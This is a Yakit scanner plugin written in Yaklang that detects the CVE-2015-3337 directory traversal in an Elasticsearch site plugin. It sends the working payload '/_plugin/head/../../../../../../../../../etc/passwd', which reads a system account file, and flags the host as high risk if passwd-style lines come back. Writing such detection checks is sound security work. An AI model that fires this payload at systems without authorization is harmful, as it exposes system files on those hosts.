# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) 
Connection: close

`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        // println(string(rsp))
        if str.MatchAllOfRegexp(rsp, `(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3}`) && str.MatchAllOfRegexp(rsp, `HTTP/1.1 200`){
            yakit.Info("%v found ElasticSearch_site插件_CVE-2015-3337目录穿越漏洞", addr)
            risk.NewRisk(
            addr,risk.title("ElasticSearch_site插件_CVE-2015-3337目录穿越漏洞"),
            risk.severity("high"),
            risk.titleVerbose("ElasticSearch_site插件_CVE-2015-3337目录穿越漏洞存在"),
            risk.type("目录遍历[Spring Cloud]"),
            risk.payload(`/_plugin/head/../../../../../../../../../etc/passwd`),
            risk.details({
                // "target": riskTarget,
                "req": string(req),
                "rsp": string(rsp),
            }),
        )
        }else{
            println("不存在ElasticSearch_site插件_CVE-2015-3337目录穿越漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/_plugin/head/../../../../../../../../../etc/passwd`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}